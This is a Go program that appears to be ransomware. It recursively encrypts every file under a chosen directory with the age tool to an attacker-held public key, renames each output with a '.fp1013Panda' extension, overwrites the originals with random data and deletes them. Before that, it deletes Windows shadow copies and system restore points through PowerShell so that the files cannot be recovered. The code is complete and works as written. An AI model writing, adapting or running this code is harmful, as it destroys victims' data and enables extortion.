package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"filippo.io/age"
	"github.com/dustin/go-humanize"
	"github.com/panjf2000/ants/v2"
	"github.com/schollz/progressbar/v3"
)

const (
	chunkSize = 90 * 1024 * 1024 // 90MB
)

func setupLogging() *os.File {
	logFile, err := os.OpenFile("encryption_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	log.SetOutput(logFile)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	return logFile
}

func loadPublicKey(filename string) ([]age.Recipient, error) {
	log.Printf("Loading public key from file: %s", filename)
	keyData, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("error reading public key file: %v", err)
	}
	publicKeyStr := strings.TrimSpace(string(keyData))
	recipients, err := age.ParseRecipients(strings.NewReader(publicKeyStr))
	if err != nil {
		return nil, fmt.Errorf("error parsing public key: %v", err)
	}
	return recipients, nil
}

func encryptFile(inputFile, outputFile string, recipients []age.Recipient) error {
	log.Printf("Starting encryption of file: %s", inputFile)
	startTime := time.Now()

	// Open input file
	inFile, err := os.Open(inputFile)
	if err != nil {
		return fmt.Errorf("error opening input file: %v", err)
	}
	defer inFile.Close()
	fileInfo, err := inFile.Stat()
	if err != nil {
		return fmt.Errorf("error getting file info: %v", err)
	}
	fileSize := fileInfo.Size()

	// Read the entire file content if it's <= 1MB
	var fileContent []byte
	if fileSize <= chunkSize {
		fileContent = make([]byte, fileSize)
		_, err := io.ReadFull(inFile, fileContent)
		if err != nil {
			return fmt.Errorf("error reading input file: %v", err)
		}
	} else {
		// Read file in chunks for larger files
		fileContent = make([]byte, 0, fileSize)
		buf := make([]byte, chunkSize)
		for {
			n, err := inFile.Read(buf)
			if n > 0 {
				fileContent = append(fileContent, buf[:n]...)
			}
			if err == io.EOF {
				break
			}
			if err != nil {
				return fmt.Errorf("error reading input file: %v", err)
			}
		}
	}

	// Create output file with secure permissions
	outFile, err := os.OpenFile(outputFile, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("error creating output file: %v", err)
	}
	defer outFile.Close()

	// Initialize age writer
	encWriter, err := age.Encrypt(outFile, recipients...)
	if err != nil {
		return fmt.Errorf("error initializing age writer: %v", err)
	}

	// Initialize progress bar
	bar := progressbar.NewOptions64(
		fileSize,
		progressbar.OptionSetDescription(fmt.Sprintf("Encrypting %s", filepath.Base(inputFile))),
		progressbar.OptionSetRenderBlankState(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionThrottle(100*time.Millisecond),
	)

	// Encrypt the entire file content
	if _, err := encWriter.Write(fileContent); err != nil {
		return fmt.Errorf("error writing encrypted data: %v", err)
	}
	bar.Add(int(fileSize))

	// Finalize encryption
	if err := encWriter.Close(); err != nil {
		return fmt.Errorf("error finalizing encryption: %v", err)
	}

	log.Printf("Encryption completed in %s. File size: %s",
		time.Since(startTime).Round(time.Second),
		humanize.Bytes(uint64(fileSize)),
	)
	return nil
}

func secureDelete(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("error stating file: %v", err)
	}

	// Overwrite 3 times with random data
	for i := 0; i < 3; i++ {
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("error opening file for overwrite: %v", err)
		}
		bar := progressbar.NewOptions64(
			info.Size(),
			progressbar.OptionSetDescription(fmt.Sprintf("Overwriting %s (pass %d)", filepath.Base(path), i+1)),
			progressbar.OptionSetRenderBlankState(true),
			progressbar.OptionShowBytes(true),
			progressbar.OptionThrottle(100*time.Millisecond),
		)
		buf := make([]byte, chunkSize)
		var written int64
		for written < info.Size() {
			_, err := rand.Read(buf)
			if err != nil {
				f.Close()
				return fmt.Errorf("error generating random data: %v", err)
			}
			n, err := f.Write(buf)
			if err != nil {
				f.Close()
				return fmt.Errorf("error overwriting file: %v", err)
			}
			written += int64(n)
			bar.Add(n)
		}
		if err := f.Sync(); err != nil {
			f.Close()
			return fmt.Errorf("error syncing file: %v", err)
		}
		f.Close()
	}

	// Generate random suffix for new name
	randSuffix := make([]byte, 8)
	if _, err := rand.Read(randSuffix); err != nil {
		return fmt.Errorf("error generating random suffix: %v", err)
	}
	newName := filepath.Join(filepath.Dir(path), fmt.Sprintf(".%x", randSuffix))
	if err := os.Rename(path, newName); err != nil {
		return fmt.Errorf("error renaming file: %v", err)
	}
	return os.Remove(newName)
}

func deleteShadowCopies() error {
	cmd := exec.Command("powershell", "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("error deleting shadow copies: %v, output: %s", err, string(output))
	}
	return nil
}

func deleteSystemRestorePoints() error {
	cmd := exec.Command("powershell", "Get-ComputerRestorePoint | Remove-ComputerRestorePoint -Confirm:$false")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("error deleting restore points: %v, output: %s", err, string(output))
	}
	return nil
}

func recursiveEncrypt(dir string, recipients []age.Recipient, pool *ants.Pool, wg *sync.WaitGroup) error {
	defer wg.Done()
	files, err := os.ReadDir(dir)
	if err != nil {
		log.Printf("Error reading directory %s: %v", dir, err)
		return err
	}
	for _, file := range files {
		path := filepath.Join(dir, file.Name())
		if file.IsDir() {
			wg.Add(1)
			pool.Submit(func() {
				recursiveEncrypt(path, recipients, pool, wg)
			})
		} else {
			outputFile := path + ".fp1013Panda"
			wg.Add(1)
			pool.Submit(func() {
				defer wg.Done()
				if err := encryptFile(path, outputFile, recipients); err != nil {
					log.Printf("Encryption failed for file %s: %v", path, err)
				}
				if err := secureDelete(path); err != nil {
					log.Printf("Error securely deleting file %s: %v", path, err)
				}
			})
		}
	}
	return nil
}

func main() {
	logFile := setupLogging()
	defer logFile.Close()
	log.Println("Starting encryption program")

	dir := flag.String("dir", "", "Directory to encrypt")
	keyFile := flag.String("key", "", "Path to the public key file")
	numWorkers := flag.Int("workers", 4, "Number of worker threads")
	flag.Parse()

	if *dir == "" || *keyFile == "" {
		log.Fatal("Both --dir and --key arguments required")
	}

	recipients, err := loadPublicKey(*keyFile)
	if err != nil {
		log.Fatalf("Error loading public key: %v", err)
	}

	if err := deleteShadowCopies(); err != nil {
		log.Printf("Error deleting shadow copies: %v", err)
	}

	if err := deleteSystemRestorePoints(); err != nil {
		log.Printf("Error deleting system restore points: %v", err)
	}

	pool, err := ants.NewPool(*numWorkers)
	if err != nil {
		log.Fatalf("Error creating pool: %v", err)
	}
	defer pool.Release()

	var wg sync.WaitGroup
	wg.Add(1)
	pool.Submit(func() {
		recursiveEncrypt(*dir, recipients, pool, &wg)
	})

	wg.Wait()
	log.Println("Encryption process completed successfully")
}
